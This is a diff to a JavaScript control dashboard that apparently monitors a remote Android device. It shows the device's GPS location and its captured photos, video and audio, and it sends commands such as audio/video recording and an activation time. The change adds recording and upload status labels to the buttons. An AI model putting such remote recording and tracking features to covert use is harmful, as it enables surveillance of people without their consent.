@@ -184,7 +184,7 @@ function loadDeviceData(deviceUid) {
 }
 
 // ==========================================
-// REAL-TIME DATA STREAM (FIXED MEDIA DISPLAY)
+// REAL-TIME DATA STREAM (WITH UPLOAD STATE TRACKING)
 // ==========================================
 function initializeTelemetryStream(uid) {
     const statusRef = ref(database, `devices/${uid}/status`);
@@ -211,11 +211,39 @@ function initializeTelemetryStream(uid) {
             if (mapLink) mapLink.href = `https://www.google.com/maps/search/?api=1&query=${data.latitude},${data.longitude}`;
         }
 
+        // ✅ NEW: MEDIA UPLOAD STATE TRACKING
+        // Updates button text to REC/UPD... based on Android app status
+        const uploadState = data.media_upload_state || "idle";
+        const audioBtn = document.getElementById('cmd-audio');
+        const videoBtn = document.getElementById('cmd-video');
+
+        if (audioBtn) {
+            const stateEl = audioBtn.querySelector('.toggle-state');
+            if (uploadState === "recording") {
+                audioBtn.classList.add('active');
+                if(stateEl) { stateEl.textContent = 'REC'; stateEl.style.color = '#ffaa00'; }
+            } else if (uploadState === "uploading") {
+                audioBtn.classList.add('active');
+                if(stateEl) { stateEl.textContent = 'UPD...'; stateEl.style.color = '#00e5ff'; }
+            }
+        }
+
+        if (videoBtn) {
+            const stateEl = videoBtn.querySelector('.toggle-state');
+            if (uploadState === "recording") {
+                videoBtn.classList.add('active');
+                if(stateEl) { stateEl.textContent = 'REC'; stateEl.style.color = '#ffaa00'; }
+            } else if (uploadState === "uploading") {
+                videoBtn.classList.add('active');
+                if(stateEl) { stateEl.textContent = 'UPD...'; stateEl.style.color = '#00e5ff'; }
+            }
+        }
+
         // --- MEDIA HANDLING LOGIC ---
         const img = document.getElementById('cameraPreviewFrame');
         const video = document.getElementById('mediaVideoPlayer');
         const audio = document.getElementById('mediaAudioPlayer');
-        const audioContainer = document.getElementById('audio-container'); // New container
+        const audioContainer = document.getElementById('audio-container');
         const placeholder = document.getElementById('mediaPlaceholderText');
         const timestamp = document.getElementById('captureTimestamp');
 
@@ -244,7 +272,7 @@ function initializeTelemetryStream(uid) {
             img.src = photoUrl + cacheBuster;
             img.style.display = 'block';
             activeMedia = true;
-            console.log(' Displaying Photo');
+            console.log('📸 Displaying Photo');
         } 
         // 2. Check Video
         else if (videoUrl && video) {
@@ -372,7 +400,7 @@ function setupCommandListeners(deviceUid) {
     // 3. TIME SETTER
     document.getElementById('time-setter')?.addEventListener('change', (e) => {
         if (e.target.value) {
-            console.log('⏰ Setting activation time:', e.target.value);
+            console.log(' Setting activation time:', e.target.value);
             sendRemoteCommand(deviceUid, 'activation_time', e.target.value);
         }
     });
